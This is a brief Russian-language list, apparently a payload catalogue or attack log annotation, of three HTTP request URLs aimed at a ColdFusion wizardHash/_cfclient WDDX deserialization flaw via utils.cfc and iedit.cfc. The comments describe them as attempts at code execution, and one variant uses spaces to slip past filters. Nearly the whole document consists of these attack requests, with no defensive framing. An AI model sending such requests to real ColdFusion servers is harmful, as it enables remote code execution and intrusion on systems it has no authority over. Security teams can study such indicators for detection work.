# Deserialization / CFML Injection (ColdFusion)

### Запрос 1
```http
/utils.cfc?method=wizardHash&inPassword=foo&_cfclient=true&returnFormat=wddx
```
Действие: использование уязвимости ColdFusion wizardHash для выполнения кода (десериализация WDDX).

### Запрос 2
```http
/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo
```
Действие: аналогично, через iedit.cfc.

### Запрос 3
```http
/wizards/common/utils.cfc?method=wizardHash%20inPassword=bar%20_cfclient=true
```
Действие: ещё одна попытка с пробелами в параметрах (обход фильтров).
